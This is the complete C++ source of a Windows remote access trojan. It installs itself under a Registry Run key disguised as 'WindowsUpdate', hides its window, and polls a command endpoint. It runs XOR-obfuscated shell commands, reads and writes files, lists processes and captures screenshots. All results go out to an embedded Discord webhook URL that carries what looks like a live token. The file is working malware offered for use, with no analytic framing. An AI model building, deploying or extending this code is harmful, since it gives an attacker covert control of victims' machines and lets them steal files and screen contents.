/*
 * agent.cpp — Full Remote Access Tool → /bin
 * Compile: x86_64-w64-mingw32-g++ -static -O2 -s -o agent.exe agent.cpp
 *          -lwinhttp -lwininet -ladvapi32 -luser32 -lgdi32 -mwindows
 *
 * Architecture:
 *   C2 model: HTTP polling. Reads commands from a hosted text endpoint,
 *             executes them, POSTs results back to Discord webhook.
 *   Commands: shell, upload, download, proclist, screenshot, sleep, uninstall, kill
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <ctime>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// ============================================================
//  CONFIG — Replace with your endpoints
// ============================================================
#define CMD_URL     L"<<<YOUR_COMMAND_ENDPOINT>>>"   // GET — returns command text
#define WEBHOOK_URL L"https://discord.com/api/webhooks/1533019807627214928/n1FLzESTi1BhzC5R90ok8V7esa2RasQzOFhZVLoEeA-cBoUSB2DXuobLhhTuwc4n1BQf"
#define PERSISTENCE_NAME L"WindowsUpdate"
#define SLEEP_MS    5000          // poll interval
#define JITTER_MS   2000          // ± random jitter
// ============================================================

// --- XOR encrypt/decrypt (shared key obfuscation) ---
const unsigned char XOR_KEY[] = {0x5A, 0x3C, 0x7E, 0x91, 0x2D, 0x4F, 0x88, 0x13};
const size_t KEY_LEN = sizeof(XOR_KEY);

std::string XorCrypt(const std::string& data) {
    std::string out = data;
    for (size_t i = 0; i < out.size(); i++)
        out[i] ^= XOR_KEY[i % KEY_LEN];
    return out;
}

// --- Base64 encode (no external deps) ---
std::string Base64Encode(const std::vector<unsigned char>& data) {
    static const char* tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, bits = -6;
    for (unsigned char c : data) {
        val = (val << 8) + c;
        bits += 8;
        while (bits >= 0) {
            out += tbl[(val >> bits) & 0x3F];
            bits -= 6;
        }
    }
    if (bits > -6) out += tbl[((val << 8) >> (bits + 8)) & 0x3F];
    while (out.size() % 4) out += '=';
    return out;
}

std::vector<unsigned char> Base64Decode(const std::string& s) {
    static const int T[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,0,-1,-1,
        -1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1
    };
    std::vector<unsigned char> out;
    int val = 0, bits = -8;
    for (char c : s) {
        if (c == '=' || c < 0) break;
        int v = T[(unsigned char)c];
        if (v == -1) continue;
        val = (val << 6) + v;
        bits += 6;
        if (bits >= 0) {
            out.push_back((val >> bits) & 0xFF);
            bits -= 8;
        }
    }
    return out;
}

// --- WinHTTP helpers ---
std::string HttpGet(const wchar_t* host, const wchar_t* path) {
    std::string result;
    HINTERNET hSess = WinHttpOpen(L"agent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSess) return result;
    HINTERNET hConn = WinHttpConnect(hSess, host, 443, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return result; }
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", path,
        NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return result; }
    if (WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0) &&
        WinHttpReceiveResponse(hReq, NULL)) {
        char buf[8192]; DWORD read = 0;
        while (WinHttpReadData(hReq, buf, sizeof(buf) - 1, &read) && read > 0) {
            buf[read] = 0;
            result += buf;
        }
    }
    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return result;
}

bool HttpPost(const wchar_t* host, const wchar_t* path, const std::string& body) {
    HINTERNET hSess = WinHttpOpen(L"agent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSess) return false;
    HINTERNET hConn = WinHttpConnect(hSess, host, 443, 0);
    if (!hConn) { WinHttpCloseHandle(hSess); return false; }
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", path,
        NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); return false; }
    LPCWSTR hdrs = L"Content-Type: application/json\r\n";
    bool ok = WinHttpSendRequest(hReq, hdrs, -1,
        (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (ok) WinHttpReceiveResponse(hReq, NULL);
    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    WinHttpCloseHandle(hSess);
    return ok;
}

// --- Parse webhook URL ---
void ParseUrl(const wchar_t* url, std::wstring& host, std::wstring& path) {
    std::wstring u(url);
    size_t start = u.find(L"://");
    if (start == std::wstring::npos) { host = url; path = L"/"; return; }
    start += 3;
    size_t slash = u.find(L'/', start);
    if (slash == std::wstring::npos) {
        host = u.substr(start); path = L"/";
    } else {
        host = u.substr(start, slash - start);
        path = u.substr(slash);
    }
}

// --- JSON escape ---
std::string JsonEscape(const std::string& s) {
    std::string out;
    for (char c : s) {
        switch (c) {
            case '\\': out += "\\\\"; break;
            case '"':  out += "\\\""; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:
                if (c < 0x20) { char buf[8]; snprintf(buf, 8, "\\u%04x", (unsigned char)c); out += buf; }
                else out += c;
        }
    }
    return out;
}

// --- Report result back to webhook ---
void Report(const std::string& title, const std::string& body, int color) {
    std::string json = "{\"embeds\":[{\"title\":\"" + JsonEscape(title) + "\","
        "\"description\":\"" + JsonEscape(body) + "\","
        "\"color\":" + std::to_string(color) + "}]}";
    std::wstring host, path;
    ParseUrl(WEBHOOK_URL, host, path);
    HttpPost(host.c_str(), path.c_str(), json);
}

// --- Shell command execution ---
std::string RunCmd(const std::string& cmd) {
    std::string result;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "ERROR: pipe creation failed";

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi = {};
    std::string cmdLine = "cmd.exe /c " + cmd;
    char* cl = (char*)cmdLine.c_str();

    if (CreateProcessA(NULL, cl, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        WaitForSingleObject(pi.hProcess, 30000); // 30s timeout
        char buf[4096]; DWORD read;
        while (ReadFile(hRead, buf, sizeof(buf) - 1, &read, NULL) && read > 0) {
            buf[read] = 0;
            result += buf;
            if (result.size() > 50000) { result += "\n[TRUNCATED]"; break; }
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        result = "ERROR: process creation failed";
        CloseHandle(hWrite);
    }
    CloseHandle(hRead);
    if (result.empty()) result = "(no output)";
    return result;
}

// --- Process list ---
std::string ProcList() {
    std::ostringstream ss;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "ERROR: snapshot failed";
    PROCESSENTRY32W pe = {sizeof(pe)};
    if (Process32FirstW(snap, &pe)) {
        do {
            char name[260];
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), NULL, NULL);
            ss << "[" << pe.th32ProcessID << "] " << name << "\n";
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return ss.str();
}

// --- Screenshot (BMP → base64) ---
std::string Screenshot() {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL);
    HDC mdc = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, bmp);
    BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

    // BMP header + pixel data
    BITMAPINFOHEADER bi = {sizeof(bi), w, h, 1, 24, BI_RGB};
    int rowSize = ((w * 24 + 31) / 32) * 4;
    std::vector<unsigned char> bmpData(sizeof(BITMAPFILEHEADER) + sizeof(bi) + rowSize * h);

    BITMAPFILEHEADER* bf = (BITMAPFILEHEADER*)bmpData.data();
    bf->bfType = 0x4D42; bf->bfSize = (DWORD)bmpData.size();
    bf->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(bi);
    memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(bi));
    GetDIBits(mdc, bmp, 0, h,
        bmpData.data() + sizeof(BITMAPFILEHEADER) + sizeof(bi),
        (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DeleteObject(bmp);
    DeleteDC(mdc);
    ReleaseDC(NULL, hdc);

    return Base64Encode(bmpData);
}

// --- File download (read local file → base64 string) ---
std::string FileDownload(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return "ERROR: cannot open " + path;
    std::vector<unsigned char> data((std::istreambuf_iterator<char>(f)),
                                     std::istreambuf_iterator<char>());
    if (data.size() > 5000000) return "ERROR: file too large (>5MB)";
    return Base64Encode(data);
}

// --- File upload (base64 string → write local file) ---
std::string FileUpload(const std::string& path, const std::string& b64) {
    std::vector<unsigned char> data = Base64Decode(b64);
    std::ofstream f(path, std::ios::binary);
    if (!f) return "ERROR: cannot write to " + path;
    f.write((const char*)data.data(), data.size());
    f.close();
    return "OK: " + std::to_string(data.size()) + " bytes written to " + path;
}

// --- Persistence ---
void SetPersistence() {
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegSetValueExW(hk, PERSISTENCE_NAME, 0, REG_SZ,
            (const BYTE*)selfPath,
            (DWORD)((wcslen(selfPath) + 1) * sizeof(wchar_t)));
        RegCloseKey(hk);
    }
}

void RemovePersistence() {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE | DELETE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueW(hk, PERSISTENCE_NAME);
        RegCloseKey(hk);
    }
}

// --- Random jitter ---
int JitterSleep() {
    int jitter = rand() % JITTER_MS;
    Sleep(SLEEP_MS + jitter);
    return SLEEP_MS + jitter;
}

// --- Command parser ---
// Format:  CMD:payload
// Examples:
//   shell:whoami /all
//   upload:C:\path\to\save.txt:BASE64DATA
//   download:C:\path\to\read.txt
//   proclist:
//   screenshot:
//   sleep:10000
//   uninstall:
//   kill:
void ExecuteCommand(const std::string& cmdLine) {
    if (cmdLine.empty()) return;

    size_t colon = cmdLine.find(':');
    std::string cmd, payload;
    if (colon != std::string::npos) {
        cmd = cmdLine.substr(0, colon);
        payload = cmdLine.substr(colon + 1);
    } else {
        cmd = cmdLine;
    }

    // Decrypt payload if present
    if (!payload.empty()) payload = XorCrypt(payload);

    if (cmd == "shell") {
        std::string out = RunCmd(payload);
        Report("Shell Output", "```\n" + out + "\n```", 3447003);
    }
    else if (cmd == "upload") {
        // upload:path:b64data
        size_t colon2 = payload.find(':');
        if (colon2 != std::string::npos) {
            std::string path = payload.substr(0, colon2);
            std::string data = payload.substr(colon2 + 1);
            std::string res = FileUpload(path, data);
            Report("Upload", res, 65280);
        } else {
            Report("Upload Error", "Missing path/data separator", 16711680);
        }
    }
    else if (cmd == "download") {
        std::string data = FileDownload(payload);
        std::string preview = data.size() > 500
            ? ("base64[" + std::to_string(data.size()) + " bytes]: " + data.substr(0, 500) + "...")
            : data;
        Report("Download: " + payload, preview, 65280);
    }
    else if (cmd == "proclist") {
        Report("Process List", "```\n" + ProcList() + "\n```", 3447003);
    }
    else if (cmd == "screenshot") {
        std::string bmp = Screenshot();
        Report("Screenshot", "base64[" + std::to_string(bmp.size()) + " bytes]: "
            + bmp.substr(0, 1900), 16753920);
    }
    else if (cmd == "sleep") {
        int ms = atoi(payload.c_str());
        if (ms > 0 && ms <= 300000) {
            Report("Sleep", "Sleeping for " + std::to_string(ms) + "ms", 16753920);
            Sleep(ms);
        }
    }
    else if (cmd == "uninstall") {
        RemovePersistence();
        Report("Uninstall", "Persistence removed. Exiting.", 16711680);
        ExitProcess(0);
    }
    else if (cmd == "kill") {
        Report("Kill", "Terminating.", 16711680);
        ExitProcess(0);
    }
    else if (cmd == "persist") {
        SetPersistence();
        Report("Persistence", "Registry Run key set.", 65280);
    }
    else {
        Report("Unknown Command", "Received: " + cmdLine, 16753920);
    }
}

// ============================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    srand((unsigned)time(NULL));

    // Persistence on first run
    SetPersistence();

    // Parse C2 URL
    std::wstring cmdHost, cmdPath;
    ParseUrl(CMD_URL, cmdHost, cmdPath);

    // Main C2 loop
    while (true) {
        std::string raw = HttpGet(cmdHost.c_str(), cmdPath.c_str());
        if (!raw.empty()) {
            // Try XOR decrypt, fall back to plaintext
            std::string cmdLine = XorCrypt(raw);
            // Check if it looks like a valid command (has colon or is known command)
            if (cmdLine.find("shell:") != std::string::npos ||
                cmdLine.find("upload:") != std::string::npos ||
                cmdLine.find("download:") != std::string::npos ||
                cmdLine == "proclist" || cmdLine == "screenshot" ||
                cmdLine == "uninstall" || cmdLine == "kill") {
                ExecuteCommand(cmdLine);
                // Clear the command file (if using a mutable endpoint this is server-side)
            } else if (cmdLine.find("shell:") == std::string::npos) {
                // Plaintext fallback
                ExecuteCommand(raw);
            }
        }
        JitterSleep();
    }
    return 0;
}